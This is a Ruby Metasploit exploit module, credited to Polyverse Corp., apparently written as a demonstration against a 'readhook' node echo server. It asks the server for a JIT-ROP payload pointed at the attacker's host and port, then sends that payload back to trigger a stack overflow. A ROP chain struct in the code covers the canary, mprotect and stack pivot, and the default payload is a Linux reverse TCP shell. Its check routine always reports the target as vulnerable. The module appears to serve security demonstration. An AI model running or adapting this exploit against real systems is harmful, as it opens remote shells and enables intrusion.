class MetasploitModule < Msf::Exploit::Remote
    Rank = ManualRanking

    include Msf::Exploit::Remote::HttpClient

    module Target
        Linux = 0 # Generic Linux
    end

    def initialize(info = {})
        super(
            update_info(
                info,
                'Name'           => 'Polyverse readhook_node_echo_server example',
                'Description'    => %q{ Do a send_request_cgi() },
                'Author'         => [ 'Polyverse Corp.' ],
                'License'        => MSF_LICENSE,
                'References'     => [ [ 'URL', 'https://polyverse.com' ], ],
                'Platform'       => [ 'linux' ],
                'Payload'        => { },
                'Arch'           => [ ARCH_X64 ],
                'Targets'        => [ [ 'Linux x64', { 'Arch' => ARCH_X64, } ] ],
                'DefaultTarget'  => Target::Linux,
                'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/shell_reverse_tcp' }
            )
        )

        register_options(
        [
            Opt::LPORT(5555),
            Opt::RPORT(8080),
            OptString.new('READHOOK_BASE_URI', [true, 'The base path for READHOOK magic.', '/xyzzy']),
            OptBool.new('INTERACTIVE', [false, 'Interactive mode for live audiences and video generation.', false])
        ], self.class)
    end

    # Endian-sensitive string-to-integer converter
    def str_to_int(str)
        if str.length > 8
            return nil
        end

        n = 0
        for i in 1..str.length
            if Rex::Arch.endian(target.arch) == ENDIAN_LITTLE
                n = (n << 8) + str[str.length - i].ord
            else
                n = (n << 8) + str[i - 1].ord
            end
        end

        return n
    end

    # Formatter for binary string to hex string
    def str_to_str16(str)
        return str.unpack('H*')
    end

    # Returns that the remote host is always vulnerable
    def check
        return Exploit::CheckCode::Vulnerable
    end

    Offset = Struct.new(:r, :b, :f) do
    end

    AddressUnion = Struct.new(:p, :o, :c) do
    end

    # Define a struct representing the example payload from READHOOK.
    Payload = Struct.new(:sf_dst, :sf_canary, :sf_rbp, :rc_popRDI, :rc_stackPage, :rc_popRSI, :rc_stackSize, :rc_popRDX, :rc_permission, :rc_noop, :rc_mprotect, :rc_pivot, :pl_scu) do
        def from_makeload(encoded)
            print "encoded: ", encoded, " (length: ", encoded.length().to_s(), ")\n"
            decoded = Rex::Text.decode_base64(encoded)
            print "decoded: ", decoded, " (length: ", decoded.length().to_s(), ")\n"
            recoded = Rex::Text.encode_base64(decoded)
            print "recoded: ", recoded, " (length: ", recoded.length().to_s(), ")\n"
            self.print_table
            self.sf_canary = 1000
        end

        def print_pair(name, value)
            puts("#{name}".ljust(13) + " => " + "#{value}".ljust(16))
	end

        def print_table()
	    each_pair {|name, value| print_pair(name, value) }
	end
    end

    def exploit
        print_status("Start...")

        if check() != Exploit::CheckCode::Vulnerable
            print_error("check() failed")
            return
        end

        # Print utility for a header
        def print_header(hdr)
            print_status("-------------------------------------------------------------------")
            print_status("#{hdr}")
            print_status("-------------------------------------------------------------------")
        end

        # Print utility for a separator
        def print_separator()
            print_status("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
        end

        def interact(step, action)
            print_status()
            print_status("STEP #{step}: #{datastore['INTERACTIVE'] ? "Press <Enter>" : "Proceed"} to #{action}")
            if datastore['INTERACTIVE']
                exit() if gets[0].chomp().downcase() == 'q'
            end

            return step + 1
        end

	# Ask READHOOK for a payload that will give us a reverse shell from the remote host
        step = interact(1, "Request JITROP Payload.")
        uri = datastore['READHOOK_BASE_URI'] + "MAKEJROP" + datastore['LHOST'] + ':' + datastore['LPORT'].to_s(10)
        res = send_request_cgi( { 'method' => 'GET', 'uri' => uri } )

        if res && res.code == 200
            print_status(res.body)
#           encoded = res.body[datastore['READHOOK_BASE_URI'].length() + "OVERFLOW".length()..-1]
#           payload.from_makeload(encoded)
#           payload.print_table()

#           myString=res.body
#           myString["OVERFLOW"] = "DUMPLOAD"
#           print_status(myString)
#           res = send_request_cgi( { 'method' => 'GET', 'uri' => myString } )

            # Exploit
            step = interact(step, "Send JITROP payload back to server...")
            res = send_request_cgi( { 'method' => 'GET', 'uri' => res.body } )
        end

        print_status("Done. (If successful, you should get a promptless shell.)")
    end
end
